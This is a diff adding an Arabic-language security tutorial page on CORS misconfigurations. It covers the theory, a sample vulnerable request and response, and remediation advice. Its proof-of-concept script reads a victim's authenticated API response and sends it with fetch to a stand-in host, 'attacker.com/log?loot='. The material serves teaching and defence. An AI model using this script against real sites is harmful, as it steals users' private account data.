@@ -1,0 +1,108 @@
+<div class="meth-content-view" id="meth-content-cors_attacks" style="display: none; --tool-color: #38bdf8;" dir="rtl">
+
+  <!-- ═══ SECTION 1: HERO ═══ -->
+  <div class="cyber-hero">
+    <h2 class="hero-title"><span class="hero-icon">🌐</span> CORS Misconfigurations — عيوب مشاركة الموارد</h2>
+    <p class="hero-tagline">شرح آلية استغلال عيوب إعدادات مشاركة الموارد عابرة المواقع (CORS) لتسريب بيانات المستخدمين وقراءة الاستجابات الحساسة</p>
+    <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+      <span class="badge badge-tool">🛠️ Burp Suite · CORS PoC Generator · Fetch API</span>
+      <span class="badge badge-info">📋 OWASP: Broken Access Control | Web Security</span>
+      <span style="background: rgba(56,189,248,0.15); color: #38bdf8; padding: 4px 12px; border-radius: 20px; font-size: 0.8rem; font-weight: bold;">CVSS Impact: Medium → High (Data Leak)</span>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 2: THEORY — Same-Origin Policy & CORS ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>📚 النظرية — سياسة منشأ الطلب المشترك (SOP) ودور الـ CORS</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <p>
+        تمنع سياسة **Same-Origin Policy (SOP)** في المتصفحات أي موقع ويب خارجي من قراءة بيانات موقع آخر (مثل قراءة كود الـ HTML لاستجابة حساب البنك).
+        <br>الـ **CORS (Cross-Origin Resource Sharing)** هي آلية مبنية في المتصفحات تسمح للخادم بالإعلان عن المواقع الخارجية المسموح لها بتخطي قيود الـ SOP وقراءة بياناته.
+      </p>
+
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px;">
+        <div>
+          <h4 style="color: var(--tool-color);">🚨 ثغرة CORS Misconfiguration</h4>
+          <p>
+            تحدث الثغرة عندما يقوم السيرفر بتثبيت إعدادات تفويض متساهلة جداً، أو عندما يقوم بالرد بتمرير عنوان الـ Origin الممرر له مباشرة في الاستجابة (Origin Reflection) مع تفعيل خيار المصادقة (Credentials).
+          </p>
+        </div>
+        <div>
+          <h4 style="color: #ff6e27;">⚠️ خطر الـ Access-Control-Allow-Credentials</h4>
+          <p>
+            إذا أرجع السيرفر ترويسات:
+            <br><code>Access-Control-Allow-Origin: https://attacker.com</code>
+            <br><code>Access-Control-Allow-Credentials: true</code>
+            <br>يسمح المتصفح للموقع الخبيث بإرسال طلب بالنيابة عن الضحية حاملاً الـ Session Cookies الخاصة به، ويسمح للموقع الخبيث بقراءة استجابة الـ API الحساسة بالكامل!
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 3: ATTACK ANATOMY ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🔬 تشريح خطوات الهجوم والـ PoC Exploitation</h3></div>
+    <div style="line-height: 1.8; color: var(--text-secondary);">
+      <div style="display: flex; flex-direction: column; gap: 15px;">
+
+        <div style="background: rgba(0,229,255,0.05); padding: 15px; border-radius: 8px;">
+          <strong style="color: var(--tool-color);">1. Vulnerable Response Header Analysis (Burp capture):</strong>
+          <div class="cmd-ui-box" style="font-size: 0.85rem;">
+# Attacker Request:
+GET /api/v1/user_data HTTP/1.1
+Host: bank.com
+Origin: https://attacker.com
+Cookie: SessionID=victim_active_session_cookie_123
+
+# Vulnerable Response returned by server:
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://attacker.com
+Access-Control-Allow-Credentials: true
+Content-Type: application/json
+
+{"balance": "$1,000,000", "private_email": "victim@bank.com"}</div>
+        </div>
+
+        <div style="background: rgba(80,250,123,0.05); padding: 15px; border-radius: 8px;">
+          <strong style="color: #50fa7b;">2. Exploitation Proof-of-Concept (HTML Page hosted by attacker):</strong>
+          <pre style="background: #282a36; padding: 10px; border-radius: 6px; color: #f8f8f2;" dir="ltr"><code>&lt;script&gt;
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  // Send authenticated request to target API
+  req.open('get', 'https://bank.com/api/v1/user_data', true);
+  req.withCredentials = true;
+  req.send();
+  
+  function reqListener() {
+      // Exfiltrate response data to attacker's server
+      fetch('https://attacker.com/log?loot=' + encodeURIComponent(this.responseText));
+  };
+&lt;/script&gt;</code></pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ SECTION 4: DEFENSE & REMEDIATION ═══ -->
+  <div class="cyber-card">
+    <div class="card-header"><h3>🛡️ الحماية والدفاع — تأمين إعدادات CORS</h3></div>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <h4 style="color: #50fa7b;">✅ تأمين ترويسات الاستجابة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Never Reflect Origin:</strong> تجنب برمجة السيرفر لقراءة ترويسة الـ Origin وإرجاعها تلقائياً في الاستجابة.</li>
+          <li><strong>Strict Whitelist:</strong> تحديد النطاقات الموثوقة والمصرح لها بقراءة البيانات بدقة شديدة وقصر الـ Origin عليها بشكل ثابت.</li>
+        </ul>
+      </div>
+      <div>
+        <h4 style="color: #00e5ff;">🔒 تجنب دمج الإعدادات الخطرة</h4>
+        <ul style="line-height: 2; color: var(--text-secondary); font-size: 0.9rem;">
+          <li><strong>Credentials and Wildcard:</strong> يمنع بروتوكول المتصفح استخدام الرمز النجمي <code>*</code> مع <code>Access-Control-Allow-Credentials: true</code>. احرص على عدم محاكاة هذا الدمج يدوياً برمجياً لتجنب الاختراق.</li>
+          <li><strong>Do not trust null origin:</strong> تجنب الثقة بـ <code>null</code> كمنشأ مقبول (Access-Control-Allow-Origin: null).</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+</div>
